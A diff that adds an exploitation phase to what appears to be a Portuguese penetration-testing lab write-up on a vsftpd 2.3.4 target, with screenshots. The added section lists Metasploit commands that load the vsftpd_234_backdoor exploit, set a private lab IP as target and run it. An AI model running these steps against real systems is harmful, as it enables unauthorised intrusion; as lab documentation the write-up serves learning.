@@ -23,3 +23,14 @@ Com foco no serviço vsftpd 2.3.4, usei o comando **searchsploit** para verifica
 
 <img width="646" height="215" alt="searchexploit png" src="https://github.com/user-attachments/assets/4dc6c711-1428-4723-b2c8-d2b7ac253e56" />
 
+
+## Fase 3: Exploração
+
+Encontradas as vulnerabilidades, iniciei o o processo de invasão do sistemas por meio de diversos comandos:
+**msf6 > search vsftpd_234
+  msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
+  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit**
+
+<img width="635" height="230" alt="invasao png" src="https://github.com/user-attachments/assets/02a14128-052f-483b-9257-6d5b822f56db" />
+
